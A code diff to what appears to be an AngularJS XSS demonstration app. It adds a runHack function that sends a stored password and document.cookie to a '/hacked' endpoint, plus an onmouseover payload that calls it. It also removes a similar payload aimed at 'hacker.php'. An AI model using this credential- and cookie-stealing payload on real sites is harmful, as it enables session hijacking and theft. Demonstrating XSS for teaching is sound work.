@@ -19,14 +19,40 @@ app.config([
   },
 ]);
 
+function runHack(password) {
+  const url =
+    `/hacked?password=` +
+    password +
+    '&session=' +
+    encodeURIComponent(document.cookie);
+  fetch(url)
+    .then((res) => res.json())
+    .then((result) => {
+      const message =
+        `Response from ${url}` +
+        result.message +
+        '\n' +
+        'Exfiltrated: ' +
+        result.password;
+
+      alert(message);
+    })
+    .catch((err) => {
+      console.warn('Failed hack', err);
+      alert('Failed to extract');
+    });
+}
+
 app.controller('Ctrl', [
   '$scope',
   function ($scope) {
     $scope.input = '';
 
-    $scope.simulateXssAttack = function () {
-      var str = `<div onmouseover="javascript:fetch('hacker.php?password=' + localStorage.getItem('password') + '&session=' + encodeURIComponent(document.cookie));">MOUSE OVER ME!</div>`;
-      $scope.input = str;
-    };
+    var str = `
+    <div onmouseover="javascript:runHack(localStorage.getItem('password'))"> 
+      <strong>MOUSE</strong> <u>OVER</u> <blink>ME</blink>!
+    </div> 
+  `;
+    $scope.input = str;
   },
 ]);
